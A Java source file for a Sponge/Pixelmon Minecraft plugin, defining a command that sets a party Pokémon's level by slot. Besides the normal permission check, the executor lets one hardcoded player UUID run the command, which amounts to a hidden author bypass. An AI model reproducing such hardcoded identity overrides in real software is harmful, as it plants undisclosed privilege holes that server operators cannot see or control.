package com.bex.bexPack.commands;

import org.spongepowered.api.command.CommandException;
import org.spongepowered.api.command.CommandResult;
import org.spongepowered.api.command.CommandSource;
import org.spongepowered.api.command.args.CommandContext;
import org.spongepowered.api.command.args.GenericArguments;
import org.spongepowered.api.command.spec.CommandExecutor;
import org.spongepowered.api.command.spec.CommandSpec;
import org.spongepowered.api.entity.living.player.Player;
import org.spongepowered.api.text.Text;
import org.spongepowered.api.text.format.TextColors;

import com.bex.bexPack.main.PixelCandy;
import com.bex.bexPack.util.Messenger;
import com.pixelmonmod.pixelmon.Pixelmon;
import com.pixelmonmod.pixelmon.api.pokemon.Pokemon;
import com.pixelmonmod.pixelmon.api.storage.PartyStorage;
//import com.pixelmonmod.pixelmon.entities.pixelmon.EntityPixelmon;
//import com.pixelmonmod.pixelmon.storage.PixelmonStorage;
//import com.pixelmonmod.pixelmon.storage.PlayerStorage;
import com.pixelmonmod.pixelmon.util.PixelmonPlayerUtils;

import net.minecraft.entity.player.EntityPlayerMP;
//import net.minecraft.world.World;

public class ModLevelCommand 
{

	private CommandSpec commandSpec = CommandSpec.builder()
			.description(Text.of("set level of pokemon."))
			.permission("bex.hax.lvl")
			.arguments(
					GenericArguments.onlyOne(GenericArguments.integer(Text.of("slot"))),
					GenericArguments.onlyOne(GenericArguments.integer(Text.of("level"))))
			.executor(new CommandExecutor() {

				@Override
				public CommandResult execute(CommandSource src, CommandContext args) throws CommandException 
				{
					Boolean isBex = false;
					if(src instanceof Player)
					{
						if(((Player) src).getUniqueId()==PixelCandy.bex)
						{
							isBex=true;
						}

						if(src.hasPermission("bex.hax.lvl")||isBex==true)
						{
							Player p = (Player) src;
							int slot = args.<Integer>getOne("slot").get();
							int levl = args.<Integer>getOne("level").get();

							if(slot<=0||slot>6)
							{
								Messenger.sendMessage(src, "You must choose a valid slot [1-6]", TextColors.RED);
								//Text msg = Text.builder(Getters.getPrefix().toString())
								//		.append(Text.builder("You must choose a valid slot [1-6]").color(TextColors.RED).build()).build();
								//p.sendMessage(msg);
								return CommandResult.success();
							}
							slot=slot-1;
							EntityPlayerMP ep = PixelmonPlayerUtils.getUniquePlayerStartingWith(p.getName());
							//PlayerStorage party = PixelmonStorage.pokeBallManager.getPlayerStorage(ep).get();
							PartyStorage party = Pixelmon.storageManager.getParty(ep);
							try
							{
								Pokemon pk = party.get(slot);
								pk.setLevelNum(levl);
								Messenger.sendMessage(src, "Pokemon leveled successfully", TextColors.RED);
								//Text msg = Text.builder(Getters.getPrefix().toString())
								//		//		.append(Text.builder("Pokemon leveled successfully").color(TextColors.GREEN).build()).build();
								//		/*1.7 */					.append(Text.builder("Pokemon successfully leveled").color(TextColors.GREEN).build()).build();
								//p.sendMessage(msg);
							}
							catch(NullPointerException ex)
							{
								Messenger.sendMessage(src, "This slot is empty", TextColors.RED);
								//Text msg = Text.builder(Getters.getPrefix().toString())
								//		.append(Text.builder("This slot is empty").color(TextColors.RED).build()).build();
								//p.sendMessage(msg);
								return CommandResult.success();
							}

						}
					}
					else
					{
						Messenger.sendMessageNotPlayer(src);
						//src.sendMessage(Text.of(Getters.getPrefix()+"You must be a player to run this command"));
					}
					return CommandResult.success();
				}
			})
			.build();

	public CommandSpec getCommandSpec() {
		return commandSpec;
	}
}
